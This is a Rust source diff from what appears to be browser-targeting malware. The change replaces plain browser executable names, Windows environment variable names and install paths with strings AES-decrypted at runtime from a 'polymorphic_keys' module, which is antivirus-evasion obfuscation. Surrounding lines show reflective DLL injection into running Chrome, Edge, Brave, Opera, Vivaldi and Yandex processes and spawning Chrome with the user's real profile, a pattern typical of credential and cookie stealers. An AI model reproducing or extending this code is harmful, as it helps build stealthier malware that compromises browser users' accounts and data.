@@ -164,37 +164,88 @@ fn find_browser_pids(target_exe: &str) -> Vec<u32> {
 }
 
 fn get_browser_exe_from_registry(exe_name: &str) -> Option<PathBuf> {
-    let local = env::var("LOCALAPPDATA").unwrap_or_default();
-    let pf = env::var("ProgramFiles").unwrap_or_default();
-    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
-    match exe_name {
-        "chrome.exe" => {
-            let paths = [PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"), PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"), PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe")];
-            for p in paths { if p.exists() { return Some(p); } }
-        }
-        "msedge.exe" => {
-            let paths = [PathBuf::from(&local).join("Microsoft\\Edge\\Application\\msedge.exe"), PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"), PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe")];
-            for p in paths { if p.exists() { return Some(p); } }
-        }
-        _ => {}
+    let local_k = aes_decrypt(&polymorphic_keys::INJ_PATH_LOCALAPPDATA_ENC, &polymorphic_keys::INJ_PATH_LOCALAPPDATA_KEY, &polymorphic_keys::INJ_PATH_LOCALAPPDATA_NONCE);
+    let pf_k    = aes_decrypt(&polymorphic_keys::INJ_PATH_PROGRAMFILES_ENC, &polymorphic_keys::INJ_PATH_PROGRAMFILES_KEY, &polymorphic_keys::INJ_PATH_PROGRAMFILES_NONCE);
+    let pf86_k  = aes_decrypt(&polymorphic_keys::INJ_PATH_PF86_ENC, &polymorphic_keys::INJ_PATH_PF86_KEY, &polymorphic_keys::INJ_PATH_PF86_NONCE);
+    let local_k = String::from_utf8_lossy(&local_k).into_owned();
+    let pf_k    = String::from_utf8_lossy(&pf_k).into_owned();
+    let pf86_k  = String::from_utf8_lossy(&pf86_k).into_owned();
+    let local = env::var(&local_k).unwrap_or_default();
+    let pf    = env::var(&pf_k).unwrap_or_default();
+    let pf86  = env::var(&pf86_k).unwrap_or_default();
+    let chrome_p = aes_decrypt(&polymorphic_keys::INJ_PATH_CHROME_APP_ENC, &polymorphic_keys::INJ_PATH_CHROME_APP_KEY, &polymorphic_keys::INJ_PATH_CHROME_APP_NONCE);
+    let edge_p   = aes_decrypt(&polymorphic_keys::INJ_PATH_EDGE_APP_ENC,   &polymorphic_keys::INJ_PATH_EDGE_APP_KEY,   &polymorphic_keys::INJ_PATH_EDGE_APP_NONCE);
+    let chrome_p = String::from_utf8_lossy(&chrome_p).into_owned();
+    let edge_p   = String::from_utf8_lossy(&edge_p).into_owned();
+    let chrome_enc = aes_decrypt(&polymorphic_keys::INJ_CHROME_EXE_ENC, &polymorphic_keys::INJ_CHROME_EXE_KEY, &polymorphic_keys::INJ_CHROME_EXE_NONCE);
+    let edge_enc   = aes_decrypt(&polymorphic_keys::INJ_EDGE_EXE_ENC,   &polymorphic_keys::INJ_EDGE_EXE_KEY,   &polymorphic_keys::INJ_EDGE_EXE_NONCE);
+    let chrome_exe = String::from_utf8_lossy(&chrome_enc).into_owned();
+    let edge_exe   = String::from_utf8_lossy(&edge_enc).into_owned();
+    if exe_name == chrome_exe {
+        let paths = [PathBuf::from(&local).join(&chrome_p), PathBuf::from(&pf).join(&chrome_p), PathBuf::from(&pf86).join(&chrome_p)];
+        for p in paths { if p.exists() { return Some(p); } }
+    } else if exe_name == edge_exe {
+        let paths = [PathBuf::from(&local).join(&edge_p), PathBuf::from(&pf).join(&edge_p), PathBuf::from(&pf86).join(&edge_p)];
+        for p in paths { if p.exists() { return Some(p); } }
     }
     None
 }
 
 fn find_browser_exe_on_disk(target_exe: &str) -> Option<String> {
-    let pf = env::var("ProgramFiles").unwrap_or_default();
-    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
-    let local = env::var("LOCALAPPDATA").unwrap_or_default();
+    let local_k = aes_decrypt(&polymorphic_keys::INJ_PATH_LOCALAPPDATA_ENC, &polymorphic_keys::INJ_PATH_LOCALAPPDATA_KEY, &polymorphic_keys::INJ_PATH_LOCALAPPDATA_NONCE);
+    let pf_k    = aes_decrypt(&polymorphic_keys::INJ_PATH_PROGRAMFILES_ENC, &polymorphic_keys::INJ_PATH_PROGRAMFILES_KEY, &polymorphic_keys::INJ_PATH_PROGRAMFILES_NONCE);
+    let pf86_k  = aes_decrypt(&polymorphic_keys::INJ_PATH_PF86_ENC, &polymorphic_keys::INJ_PATH_PF86_KEY, &polymorphic_keys::INJ_PATH_PF86_NONCE);
+    let local_k = String::from_utf8_lossy(&local_k).into_owned();
+    let pf_k    = String::from_utf8_lossy(&pf_k).into_owned();
+    let pf86_k  = String::from_utf8_lossy(&pf86_k).into_owned();
+    let local = env::var(&local_k).unwrap_or_default();
+    let pf    = env::var(&pf_k).unwrap_or_default();
+    let pf86  = env::var(&pf86_k).unwrap_or_default();
+
+    let chrome_enc  = aes_decrypt(&polymorphic_keys::INJ_CHROME_EXE_ENC,  &polymorphic_keys::INJ_CHROME_EXE_KEY,  &polymorphic_keys::INJ_CHROME_EXE_NONCE);
+    let edge_enc    = aes_decrypt(&polymorphic_keys::INJ_EDGE_EXE_ENC,    &polymorphic_keys::INJ_EDGE_EXE_KEY,    &polymorphic_keys::INJ_EDGE_EXE_NONCE);
+    let brave_enc   = aes_decrypt(&polymorphic_keys::INJ_BRAVE_EXE_ENC,   &polymorphic_keys::INJ_BRAVE_EXE_KEY,   &polymorphic_keys::INJ_BRAVE_EXE_NONCE);
+    let vivaldi_enc = aes_decrypt(&polymorphic_keys::INJ_VIVALDI_EXE_ENC, &polymorphic_keys::INJ_VIVALDI_EXE_KEY, &polymorphic_keys::INJ_VIVALDI_EXE_NONCE);
+    let opera_enc   = aes_decrypt(&polymorphic_keys::INJ_OPERA_EXE_ENC,   &polymorphic_keys::INJ_OPERA_EXE_KEY,   &polymorphic_keys::INJ_OPERA_EXE_NONCE);
+    let browser_enc = aes_decrypt(&polymorphic_keys::INJ_BROWSER_EXE_ENC, &polymorphic_keys::INJ_BROWSER_EXE_KEY, &polymorphic_keys::INJ_BROWSER_EXE_NONCE);
+
+    let chrome_p  = aes_decrypt(&polymorphic_keys::INJ_PATH_CHROME_APP_ENC,  &polymorphic_keys::INJ_PATH_CHROME_APP_KEY,  &polymorphic_keys::INJ_PATH_CHROME_APP_NONCE);
+    let edge_p    = aes_decrypt(&polymorphic_keys::INJ_PATH_EDGE_APP_ENC,    &polymorphic_keys::INJ_PATH_EDGE_APP_KEY,    &polymorphic_keys::INJ_PATH_EDGE_APP_NONCE);
+    let brave_p   = aes_decrypt(&polymorphic_keys::INJ_PATH_BRAVE_APP_ENC,   &polymorphic_keys::INJ_PATH_BRAVE_APP_KEY,   &polymorphic_keys::INJ_PATH_BRAVE_APP_NONCE);
+    let vivaldi_p = aes_decrypt(&polymorphic_keys::INJ_PATH_VIVALDI_APP_ENC, &polymorphic_keys::INJ_PATH_VIVALDI_APP_KEY, &polymorphic_keys::INJ_PATH_VIVALDI_APP_NONCE);
+    let opera_p   = aes_decrypt(&polymorphic_keys::INJ_PATH_OPERA_APP_ENC,   &polymorphic_keys::INJ_PATH_OPERA_APP_KEY,   &polymorphic_keys::INJ_PATH_OPERA_APP_NONCE);
+    let yandex_p  = aes_decrypt(&polymorphic_keys::INJ_PATH_YANDEX_APP_ENC,  &polymorphic_keys::INJ_PATH_YANDEX_APP_KEY,  &polymorphic_keys::INJ_PATH_YANDEX_APP_NONCE);
+
+    let chrome_p  = String::from_utf8_lossy(&chrome_p).into_owned();
+    let edge_p    = String::from_utf8_lossy(&edge_p).into_owned();
+    let brave_p   = String::from_utf8_lossy(&brave_p).into_owned();
+    let vivaldi_p = String::from_utf8_lossy(&vivaldi_p).into_owned();
+    let opera_p   = String::from_utf8_lossy(&opera_p).into_owned();
+    let yandex_p  = String::from_utf8_lossy(&yandex_p).into_owned();
+
     let mut candidates: Vec<PathBuf> = Vec::new();
     if let Some(p) = get_browser_exe_from_registry(target_exe) { candidates.push(p); }
-    match target_exe {
-        "chrome.exe" => { candidates.push(PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe")); candidates.push(PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe")); candidates.push(PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe")); }
-        "msedge.exe" => { candidates.push(PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe")); candidates.push(PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe")); candidates.push(PathBuf::from(&local).join("Microsoft\\Edge\\Application\\msedge.exe")); }
-        "brave.exe" => { candidates.push(PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe")); candidates.push(PathBuf::from(&pf86).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe")); candidates.push(PathBuf::from(&local).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe")); }
-        "vivaldi.exe" => { candidates.push(PathBuf::from(&local).join("Vivaldi\\Application\\vivaldi.exe")); candidates.push(PathBuf::from(&pf).join("Vivaldi\\Application\\vivaldi.exe")); }
-        "opera.exe" => { candidates.push(PathBuf::from(&local).join("Programs\\Opera\\opera.exe")); candidates.push(PathBuf::from(&pf).join("Opera\\opera.exe")); }
-        "browser.exe" => { candidates.push(PathBuf::from(&local).join("Yandex\\YandexBrowser\\Application\\browser.exe")); candidates.push(PathBuf::from(&pf).join("Yandex\\YandexBrowser\\Application\\browser.exe")); }
-        _ => {}
+
+    if target_exe == String::from_utf8_lossy(&chrome_enc) {
+        candidates.push(PathBuf::from(&pf).join(&chrome_p));
+        candidates.push(PathBuf::from(&pf86).join(&chrome_p));
+        candidates.push(PathBuf::from(&local).join(&chrome_p));
+    } else if target_exe == String::from_utf8_lossy(&edge_enc) {
+        candidates.push(PathBuf::from(&pf).join(&edge_p));
+        candidates.push(PathBuf::from(&pf86).join(&edge_p));
+        candidates.push(PathBuf::from(&local).join(&edge_p));
+    } else if target_exe == String::from_utf8_lossy(&brave_enc) {
+        candidates.push(PathBuf::from(&pf).join(&brave_p));
+        candidates.push(PathBuf::from(&pf86).join(&brave_p));
+        candidates.push(PathBuf::from(&local).join(&brave_p));
+    } else if target_exe == String::from_utf8_lossy(&vivaldi_enc) {
+        candidates.push(PathBuf::from(&local).join(&vivaldi_p));
+        candidates.push(PathBuf::from(&pf).join(&vivaldi_p));
+    } else if target_exe == String::from_utf8_lossy(&opera_enc) {
+        candidates.push(PathBuf::from(&local).join(&opera_p));
+    } else if target_exe == String::from_utf8_lossy(&browser_enc) {
+        candidates.push(PathBuf::from(&local).join(&yandex_p));
+        candidates.push(PathBuf::from(&pf).join(&yandex_p));
     }
     for path in candidates { if path.exists() { return Some(path.to_string_lossy().into_owned()); } }
     None
@@ -382,7 +433,9 @@ unsafe fn inject_dll_reflective_inner(proc: *mut std::ffi::c_void, dll_data: &[u
 
 fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Path) -> Result<u32, ()> {
     let profile_str = real_profile.to_string_lossy();
-    let exe_name = std::path::Path::new(chrome_exe).file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or_else(|| "chrome.exe".to_string());
+    let chrome_default = aes_decrypt(&polymorphic_keys::INJ_CHROME_EXE_ENC, &polymorphic_keys::INJ_CHROME_EXE_KEY, &polymorphic_keys::INJ_CHROME_EXE_NONCE);
+    let chrome_default = String::from_utf8_lossy(&chrome_default).into_owned();
+    let exe_name = std::path::Path::new(chrome_exe).file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or(chrome_default);
     inj_log!("spawn_chrome: checking existing {} processes\n", exe_name);
     for pid in find_browser_pids(&exe_name) {
         let dll_bytes = fs::read(dll_path).unwrap_or_default();
